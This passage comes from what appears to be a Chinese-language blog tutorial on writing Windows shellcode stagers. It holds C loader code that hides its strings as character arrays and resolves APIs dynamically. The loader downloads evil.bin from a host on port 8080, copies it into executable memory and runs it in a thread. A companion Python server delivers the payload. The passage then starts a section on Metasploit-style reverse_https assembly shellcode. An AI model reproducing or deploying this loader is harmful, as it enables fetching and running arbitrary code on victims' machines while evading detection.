class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR UA[] = &#123; <span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR IP[] = &#123; <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR PATH[] = &#123; <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR Method[] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR Version[] = &#123; <span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br>    <span class="hljs-comment">// 3.动态获取API函数</span><br>    MyGetProcAddress pGetProcAddress = (MyGetProcAddress)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, getProcAddress);<br>    MyLoadLibraryA pLoadLibraryA = (MyLoadLibraryA)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, loadLibraryA);<br>    MyVirtualAlloc pVirtualAlloc = (MyVirtualAlloc)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, virtualAlloc);<br>    MySleep pSleep = (MySleep)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, sleep);<br>    MyRtlMoveMemory pRtlMoveMemory = (MyRtlMoveMemory)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, rtlMoveMemory);<br>    MyCreateThread pCreateThread = (MyCreateThread)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, createThread);<br>    MyWaitForSingleObject pWaitForSingleObject = (MyWaitForSingleObject)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, waitForSingleObject);<br>    MyCloseHandle pCloseHandle = (MyCloseHandle)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, closeHandle);<br><br>    MyWSAStartup pWSAStartup = (MyWSAStartup)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(ws2_32), wsaStartup);<br>    MySocket pSocket = (MySocket)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(ws2_32), socket);<br>    MyConnect pConnect = (MyConnect)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(ws2_32), connect);<br>    MySend pSend = (MySend)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(ws2_32), send);<br>    MyRecv pRecv = (MyRecv)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(ws2_32), recv);<br>    MyClosesocket pClosesocket = (MyClosesocket)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(ws2_32), closesocket);<br>    MyWSACleanup pWSACleanup = (MyWSACleanup)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(ws2_32), wsaCleanup);<br>    MyGethostbyname pGethostbyname = (MyGethostbyname)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(ws2_32), gethostbyname);<br><br>    <span class="hljs-comment">// 初始化Winsock</span><br>    WSADATA wsaData;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pWSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 转换IP地址为多字节字符串</span><br>    <span class="hljs-type">char</span>* ipStr = <span class="hljs-built_in">WideToMultiByte</span>(IP);<br>    <span class="hljs-type">char</span>* pathStr = <span class="hljs-built_in">WideToMultiByte</span>(PATH);<br>    <span class="hljs-keyword">if</span> (!ipStr || !pathStr) &#123;<br>        <span class="hljs-keyword">if</span> (ipStr) <span class="hljs-built_in">free</span>(ipStr);<br>        <span class="hljs-keyword">if</span> (pathStr) <span class="hljs-built_in">free</span>(pathStr);<br>        <span class="hljs-built_in">pWSACleanup</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 创建socket</span><br>    SOCKET sock = <span class="hljs-built_in">pSocket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br>    <span class="hljs-keyword">if</span> (sock == INVALID_SOCKET) &#123;<br>        <span class="hljs-built_in">free</span>(ipStr);<br>        <span class="hljs-built_in">free</span>(pathStr);<br>        <span class="hljs-built_in">pWSACleanup</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 设置服务器地址</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> serverAddr;<br>    <span class="hljs-built_in">memset</span>(&amp;serverAddr, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(serverAddr));<br>    serverAddr.sin_family = AF_INET;<br>    serverAddr.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">8080</span>);<br>    serverAddr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(ipStr);<br><br>    <span class="hljs-comment">// 连接到服务器</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pConnect</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serverAddr, <span class="hljs-built_in">sizeof</span>(serverAddr)) == SOCKET_ERROR) &#123;<br>        <span class="hljs-built_in">pClosesocket</span>(sock);<br>        <span class="hljs-built_in">free</span>(ipStr);<br>        <span class="hljs-built_in">free</span>(pathStr);<br>        <span class="hljs-built_in">pWSACleanup</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 构建HTTP请求</span><br>    <span class="hljs-type">char</span>* httpRequest = <span class="hljs-built_in">BuildHttpRequest</span>(ipStr, <span class="hljs-number">8080</span>, pathStr);<br>    <span class="hljs-keyword">if</span> (!httpRequest) &#123;<br>        <span class="hljs-built_in">pClosesocket</span>(sock);<br>        <span class="hljs-built_in">free</span>(ipStr);<br>        <span class="hljs-built_in">free</span>(pathStr);<br>        <span class="hljs-built_in">pWSACleanup</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 发送HTTP请求</span><br>    <span class="hljs-type">int</span> requestLen = <span class="hljs-built_in">strlen</span>(httpRequest);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pSend</span>(sock, httpRequest, requestLen, <span class="hljs-number">0</span>) == SOCKET_ERROR) &#123;<br>        <span class="hljs-built_in">free</span>(httpRequest);<br>        <span class="hljs-built_in">pClosesocket</span>(sock);<br>        <span class="hljs-built_in">free</span>(ipStr);<br>        <span class="hljs-built_in">free</span>(pathStr);<br>        <span class="hljs-built_in">pWSACleanup</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 先分配一个较大的缓冲区来接收数据（支持更大的shellcode）</span><br>    <span class="hljs-type">const</span> DWORD MAX_SHELLCODE_SIZE = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 1MB 缓冲区</span><br>    LPVOID lpbuffer = <span class="hljs-built_in">pVirtualAlloc</span>(<span class="hljs-literal">NULL</span>, MAX_SHELLCODE_SIZE, MEM_COMMIT, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!lpbuffer) &#123;<br>        <span class="hljs-built_in">free</span>(httpRequest);<br>        <span class="hljs-built_in">pClosesocket</span>(sock);<br>        <span class="hljs-built_in">free</span>(ipStr);<br>        <span class="hljs-built_in">free</span>(pathStr);<br>        <span class="hljs-built_in">pWSACleanup</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 接收HTTP响应</span><br>    <span class="hljs-type">int</span> totalReceived = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> bytesReceived = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span>* responseBuffer = (<span class="hljs-type">char</span>*)lpbuffer;<br><br>    <span class="hljs-comment">// 接收响应头和数据</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        bytesReceived = <span class="hljs-built_in">pRecv</span>(sock, responseBuffer + totalReceived, MAX_SHELLCODE_SIZE - totalReceived, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (bytesReceived &gt; <span class="hljs-number">0</span>) &#123;<br>            totalReceived += bytesReceived;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (bytesReceived &gt; <span class="hljs-number">0</span> &amp;&amp; totalReceived &lt; MAX_SHELLCODE_SIZE);<br><br>    <span class="hljs-comment">// 解析HTTP响应，提取shellcode数据</span><br>    <span class="hljs-type">int</span> shellcodeSize = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* responseBody = <span class="hljs-built_in">FindResponseBody</span>(responseBuffer);<br><br>    <span class="hljs-keyword">if</span> (responseBody) &#123;<br>        <span class="hljs-comment">// 获取Content-Length</span><br>        <span class="hljs-type">int</span> contentLength = <span class="hljs-built_in">ParseContentLength</span>(responseBuffer);<br>        <span class="hljs-keyword">if</span> (contentLength &gt; <span class="hljs-number">0</span>) &#123;<br>            shellcodeSize = contentLength;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果没有Content-Length，使用剩余数据作为shellcode</span><br>            shellcodeSize = totalReceived - (responseBody - responseBuffer);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果没有找到响应体分隔符，使用所有接收到的数据</span><br>        shellcodeSize = totalReceived;<br>    &#125;<br><br>    <span class="hljs-comment">// 清理网络资源</span><br>    <span class="hljs-built_in">free</span>(httpRequest);<br>    <span class="hljs-built_in">pClosesocket</span>(sock);<br>    <span class="hljs-built_in">free</span>(ipStr);<br>    <span class="hljs-built_in">free</span>(pathStr);<br>    <span class="hljs-built_in">pWSACleanup</span>();<br><br>    <span class="hljs-comment">// 申请一块可执行的内存区域，大小为实际读取的shellcode大小</span><br>    LPVOID pExecutableMemory = <span class="hljs-built_in">pVirtualAlloc</span>(<span class="hljs-literal">NULL</span>, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!pExecutableMemory) &#123;<br>        <span class="hljs-built_in">pVirtualAlloc</span>(lpbuffer, <span class="hljs-number">0</span>, MEM_RELEASE, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 将shellcode数据复制到可执行内存区域</span><br>    <span class="hljs-keyword">if</span> (responseBody) &#123;<br>        <span class="hljs-built_in">pRtlMoveMemory</span>(pExecutableMemory, (PVOID)responseBody, shellcodeSize);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">pRtlMoveMemory</span>(pExecutableMemory, lpbuffer, shellcodeSize);<br>    &#125;<br><br>    <span class="hljs-comment">// 释放原始缓冲区</span><br>    <span class="hljs-built_in">pVirtualAlloc</span>(lpbuffer, <span class="hljs-number">0</span>, MEM_RELEASE, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 创建一个线程执行内存中的shellcode</span><br>    HANDLE hThread = <span class="hljs-built_in">pCreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pExecutableMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hThread) &#123;<br>        <span class="hljs-comment">// 等待线程执行完成</span><br>        <span class="hljs-built_in">pWaitForSingleObject</span>(hThread, INFINITE);<br>        <span class="hljs-comment">// 关闭线程句柄</span><br>        <span class="hljs-built_in">pCloseHandle</span>(hThread);<br>    &#125;<br><br>    <span class="hljs-comment">// 释放可执行内存</span><br>    <span class="hljs-built_in">pVirtualAlloc</span>(pExecutableMemory, <span class="hljs-number">0</span>, MEM_RELEASE, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br># -*- coding: utf<span class="hljs-number">-8</span> -*-<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">Socket HTTP服务器 - 为wsocks4stager提供shellcode文件</span><br><span class="hljs-string">监听8080端口，当收到GET /evil.bin请求时返回evil.bin文件内容</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">import</span> socket</span><br><span class="hljs-function"><span class="hljs-keyword">import</span> os</span><br><span class="hljs-function"><span class="hljs-keyword">import</span> sys</span><br><span class="hljs-function"><span class="hljs-keyword">import</span> threading</span><br><span class="hljs-function">from datetime <span class="hljs-keyword">import</span> datetime</span><br><span class="hljs-function"></span><br><span class="hljs-function">def <span class="hljs-title">log_message</span><span class="hljs-params">(message)</span>:</span><br><span class="hljs-function">    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;记录日志消息&quot;</span><span class="hljs-string">&quot;&quot;</span></span><br><span class="hljs-function">    timestamp =</span> datetime.<span class="hljs-built_in">now</span>().<span class="hljs-built_in">strftime</span>(<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;[&#123;timestamp&#125;] &#123;message&#125;&quot;</span>)<br><br><span class="hljs-function">def <span class="hljs-title">handle_client</span><span class="hljs-params">(client_socket, client_address)</span>:</span><br><span class="hljs-function">    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;处理客户端连接&quot;</span><span class="hljs-string">&quot;&quot;</span></span><br><span class="hljs-function">    try:</span><br><span class="hljs-function">        # 接收HTTP请求</span><br><span class="hljs-function">        request =</span> client_socket.<span class="hljs-built_in">recv</span>(<span class="hljs-number">4096</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;收到来自 &#123;client_address[0]&#125;:&#123;client_address[1]&#125; 的请求&quot;</span>)<br><br>        # 解析请求<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request:<br>            <span class="hljs-keyword">return</span><br><br>        # 检查是否是GET请求<br>        <span class="hljs-keyword">if</span> request.<span class="hljs-built_in">startswith</span>(<span class="hljs-string">&#x27;GET&#x27;</span>):<br>            # 解析请求路径<br>            first_line = request.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>]<br>            path = first_line.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">1</span>]<br><br>            <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;请求路径: &#123;path&#125;&quot;</span>)<br><br>            # 检查是否是请求evil.bin文件<br>            <span class="hljs-keyword">if</span> path == <span class="hljs-string">&#x27;/evil.bin&#x27;</span>:<br>                # 读取evil.bin文件<br>                <span class="hljs-keyword">if</span> os.path.<span class="hljs-built_in">exists</span>(<span class="hljs-string">&#x27;evil.bin&#x27;</span>):<br>                    with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;evil.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>                        file_content = f.<span class="hljs-built_in">read</span>()<br><br>                    # 构建HTTP响应<br>                    response_headers = [<br>                        <span class="hljs-string">&#x27;HTTP/1.1 200 OK&#x27;</span>,<br>                        <span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>,<br>                        f<span class="hljs-number">&#x27;</span>Content-Length: &#123;<span class="hljs-built_in">len</span>(file_content)&#125;<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                        &#x27;</span>Connection: close<span class="hljs-number">&#x27;</span>,<br>                        <span class="hljs-string">&#x27;&#x27;,</span><br><span class="hljs-string">                        &#x27;</span>&#x27;<br>                    ]<br><br>                    response = <span class="hljs-string">&#x27;\r\n&#x27;</span>.<span class="hljs-built_in">join</span>(response_headers).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + file_content<br><br>                    # 发送响应<br>                    client_socket.<span class="hljs-built_in">send</span>(response)<br>                    <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;成功发送evil.bin文件 (&#123;len(file_content)&#125; 字节)&quot;</span>)<br><br>                <span class="hljs-keyword">else</span>:<br>                    # 文件不存在<br>                    error_response = (<br>                        <span class="hljs-string">&#x27;HTTP/1.1 404 Not Found\r\n&#x27;</span><br>                        <span class="hljs-string">&#x27;Content-Type: text/plain\r\n&#x27;</span><br>                        <span class="hljs-string">&#x27;Connection: close\r\n&#x27;</span><br>                        <span class="hljs-string">&#x27;\r\n&#x27;</span><br>                        <span class="hljs-string">&#x27;File not found: evil.bin&#x27;</span><br>                    ).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                    client_socket.<span class="hljs-built_in">send</span>(error_response)<br>                    <span class="hljs-built_in">log_message</span>(<span class="hljs-string">&quot;错误: evil.bin文件不存在&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                # 其他路径返回<span class="hljs-number">404</span><br>                error_response = (<br>                    <span class="hljs-string">&#x27;HTTP/1.1 404 Not Found\r\n&#x27;</span><br>                    <span class="hljs-string">&#x27;Content-Type: text/plain\r\n&#x27;</span><br>                    <span class="hljs-string">&#x27;Connection: close\r\n&#x27;</span><br>                    <span class="hljs-string">&#x27;\r\n&#x27;</span><br>                    f<span class="hljs-number">&#x27;</span>Path <span class="hljs-keyword">not</span> found: &#123;path&#125;&#x27;<br>                ).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                client_socket.<span class="hljs-built_in">send</span>(error_response)<br>                <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;404错误: 路径 &#123;path&#125; 不存在&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            # 非GET请求<br>            error_response = (<br>                <span class="hljs-string">&#x27;HTTP/1.1 405 Method Not Allowed\r\n&#x27;</span><br>                <span class="hljs-string">&#x27;Content-Type: text/plain\r\n&#x27;</span><br>                <span class="hljs-string">&#x27;Connection: close\r\n&#x27;</span><br>                <span class="hljs-string">&#x27;\r\n&#x27;</span><br>                <span class="hljs-string">&#x27;Only GET method is allowed&#x27;</span><br>            ).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            client_socket.<span class="hljs-built_in">send</span>(error_response)<br>            <span class="hljs-built_in">log_message</span>(<span class="hljs-string">&quot;错误: 只支持GET请求&quot;</span>)<br>            <br>    except Exception as e:<br>        <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;处理客户端请求时出错: &#123;e&#125;&quot;</span>)<br>    finally:<br>        client_socket.<span class="hljs-built_in">close</span>()<br><br>def <span class="hljs-built_in">main</span>():<br>    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;主函数&quot;</span><span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Socket HTTP服务器 - wsocks4stager配套工具&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <br>    # 检查并创建evil.bin文件<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.<span class="hljs-built_in">exists</span>(<span class="hljs-string">&#x27;evil.bin&#x27;</span>):<br>        <span class="hljs-built_in">log_message</span>(<span class="hljs-string">&quot;evil.bin文件不存在，创建示例文件...&quot;</span>)<br>        <span class="hljs-built_in">create_sample_evil_bin</span>()<br>    <span class="hljs-keyword">else</span>:<br>        file_size = os.path.<span class="hljs-built_in">getsize</span>(<span class="hljs-string">&#x27;evil.bin&#x27;</span>)<br>        <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;找到evil.bin文件 (&#123;file_size&#125; 字节)&quot;</span>)<br>    <br>    # 创建socket服务器<br>    server_socket = socket.<span class="hljs-built_in">socket</span>(socket.AF_INET, socket.SOCK_STREAM)<br>    server_socket.<span class="hljs-built_in">setsockopt</span>(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    <br>    # 绑定到<span class="hljs-number">8080</span>端口<br>    host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>  # 监听所有接口<br>    port = <span class="hljs-number">8080</span><br>    <br>    <span class="hljs-keyword">try</span>:<br>        server_socket.<span class="hljs-built_in">bind</span>((host, port))<br>        server_socket.<span class="hljs-built_in">listen</span>(<span class="hljs-number">5</span>)<br>        <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;服务器启动成功，监听 &#123;host&#125;:&#123;port&#125;&quot;</span>)<br>        <span class="hljs-built_in">log_message</span>(<span class="hljs-string">&quot;等待客户端连接...&quot;</span>)<br>        <span class="hljs-built_in">log_message</span>(<span class="hljs-string">&quot;按 Ctrl+C 停止服务器&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br>        <br>        <span class="hljs-keyword">while</span> True:<br>            <span class="hljs-keyword">try</span>:<br>                # 接受客户端连接<br>                client_socket, client_address = server_socket.<span class="hljs-built_in">accept</span>()<br>                <br>                # 为每个客户端创建新线程<br>                client_thread = threading.<span class="hljs-built_in">Thread</span>(<br>                    target=handle_client,<br>                    args=(client_socket, client_address)<br>                )<br>                client_thread.daemon = True<br>                client_thread.<span class="hljs-built_in">start</span>()<br>                <br>            except KeyboardInterrupt:<br>                <span class="hljs-built_in">log_message</span>(<span class="hljs-string">&quot;收到停止信号，正在关闭服务器...&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>            except Exception as e:<br>                <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;接受连接时出错: &#123;e&#125;&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br>                <br>    except Exception as e:<br>        <span class="hljs-built_in">log_message</span>(f<span class="hljs-string">&quot;服务器启动失败: &#123;e&#125;&quot;</span>)<br>        sys.<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>)<br>    finally:<br>        server_socket.<span class="hljs-built_in">close</span>()<br>        <span class="hljs-built_in">log_message</span>(<span class="hljs-string">&quot;服务器已关闭&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">main</span>()<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760363869544-213f70d0-3256-4dda-aa67-f64199e93e7d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="5-4-纯汇编远程-shellcode（wininet）"><a href="#5-4-纯汇编远程-shellcode（wininet）" class="headerlink" title="5.4 纯汇编远程 shellcode（wininet）"></a>5.4 纯汇编远程 shellcode（wininet）</h2><p>依旧是这三个文件的内容哈，开始吧</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_https.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_https.asm</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/stager/stager_reverse_https.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/stager/stager_reverse_https.asm</a></p>
<p>在此之前的 shellcode 弹窗已经详细研究了 <code>block_api.asm</code>的汇编内容，现在需要详细的研究余下两个代码的内容。</p>
<p>因为计算 hash 很麻烦，因此写了一个计算 hash 的脚本；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 